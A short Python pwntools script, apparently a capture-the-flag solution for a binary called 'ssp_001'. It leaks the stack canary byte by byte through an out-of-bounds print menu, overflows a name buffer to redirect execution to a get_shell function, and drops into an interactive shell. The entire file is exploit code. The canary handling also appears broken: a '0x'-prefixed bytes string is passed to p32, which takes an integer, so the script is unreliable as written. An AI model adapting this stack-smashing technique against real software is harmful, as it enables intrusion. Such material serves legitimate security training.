from pwn import *

p = process("./ssp_001")
e = ELF("./ssp_001")

canary = b'0x'
get_shell = e.symbols['get_shell']

p.recvuntil(b'> ')

def leak_canary(idx):
    p.sendline(b'P')
    p.recvuntil(b': ')
    p.sendline(str(idx))
    p.recvuntil(b': ')
    return p.recv(2)

canary += leak_canary(0x83)
canary += leak_canary(0x82)
canary += leak_canary(0x81)
canary += leak_canary(0x80)

print(canary)
print(get_shell)

payload = b'A'*0x40
payload += p32(canary)
payload += b'B'*0x8     #dummy+sfp
payload += p32(get_shell)

p.recvuntil(b'> ')
p.sendline(b'E')
p.recvuntil(b'Size : ')
p.sendline(str(len(payload)))
p.recvuntil(b'Name : ')
p.send(payload)

p.interactive()